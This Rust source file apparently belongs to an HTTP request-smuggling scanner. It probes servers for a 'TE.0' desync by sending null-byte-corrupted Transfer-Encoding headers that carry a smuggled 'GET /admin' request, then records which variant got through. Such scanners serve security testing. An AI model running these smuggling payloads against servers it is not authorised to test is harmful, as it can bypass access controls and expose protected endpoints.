use crate::auth::AuthStore;
use crate::net::{h1, NetConfig};
use crate::output::ScanResult;

pub async fn probe(
    cfg: &NetConfig,
    auth: Option<&AuthStore>,
    silent: &bool,
) -> Result<ScanResult, String> {
    let host = &cfg.host;

    let baseline_req = h1::build_request("GET", "/", host, &[], b"");
    let baseline = h1::send_request(cfg, &baseline_req, auth).await?;

    // TE.0: inject null-byte or broken TE header to cause parsing discrepancy
    let variants: Vec<(&str, Vec<u8>)> = vec![
        ("null-byte", b"Transfer-Encoding:\x00chunked".to_vec()),
        ("carriage-null", b"Transfer-Encoding:\r\n\x00chunked".to_vec()),
        ("broken-charset", b"Transfer-Encoding: ch\x00unked".to_vec()),
    ];

    let mut vulnerable = false;
    let mut success_bypass = None;
    let mut second_status = 0u16;

    for (name, te_bytes) in &variants {
        let te_val = String::from_utf8_lossy(te_bytes);
        let smuggled_req: &[u8] = b"GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n";
        let chunked_body = h1::build_chunked_body(&[smuggled_req]);

        let mut request = format!(
            "POST / HTTP/1.1\r\nHost: {}\r\n{}\r\nUser-Agent: ghostroute/1.0.0\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n{}",
            host, te_val, String::from_utf8_lossy(&chunked_body)
        );

        if let Some(a) = auth {
            let mut bytes = request.into_bytes();
            a.apply_to_request(&mut bytes);
            request = String::from_utf8(bytes).map_err(|e| e.to_string())?;
        }

        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        use tokio::time::timeout;
        use std::time::Duration;

        let mut conn = match crate::net::connect(cfg).await {
            Ok(c) => c,
            Err(_) => continue,
        };

        conn.write_all(request.as_bytes()).await.ok();

        let mut buf = Vec::with_capacity(4096);
        let mut tmp = [0u8; 8192];
        loop {
            match timeout(Duration::from_secs(cfg.timeout.as_secs()), conn.read(&mut tmp)).await {
                Ok(Ok(0)) => break,
                Ok(Ok(n)) => buf.extend_from_slice(&tmp[..n]),
                Ok(Err(_)) => break,
                Err(_) => break,
            }
            if buf.len() > 1_000_000 { break; }
        }
        let _ = h1::parse_response(&buf);

        let second_req = h1::build_request("GET", "/", host, &[], b"");
        conn.write_all(&second_req).await.ok();

        let mut buf2 = Vec::with_capacity(4096);
        loop {
            match timeout(Duration::from_secs(cfg.timeout.as_secs()), conn.read(&mut tmp)).await {
                Ok(Ok(0)) => break,
                Ok(Ok(n)) => buf2.extend_from_slice(&tmp[..n]),
                Ok(Err(_)) => break,
                Err(_) => break,
            }
            if buf2.len() > 1_000_000 { break; }
        }

        if let Ok(second_resp) = h1::parse_response(&buf2) {
            second_status = second_resp.status_code;
            if second_resp.body != baseline.body || second_resp.status_code != baseline.status_code {
                vulnerable = true;
                success_bypass = Some(name.to_string());
                if !*silent {
                    eprintln!("  [DET] TE.0 variant confirmed with: {}", name);
                }
                break;
            }
        }
    }

    let host_name = &cfg.host;
    Ok(ScanResult {
        host: host_name.to_string(),
        port: cfg.port,
        variant: "te0".to_string(),
        vulnerable,
        server: baseline.server.clone(),
        bypass: success_bypass,
        status_code: second_status,
        details: if vulnerable {
            Some("TE.0 confirmed via null-byte/corrupted TE header".into())
        } else {
            None
        },
        ..Default::default()
    })
}
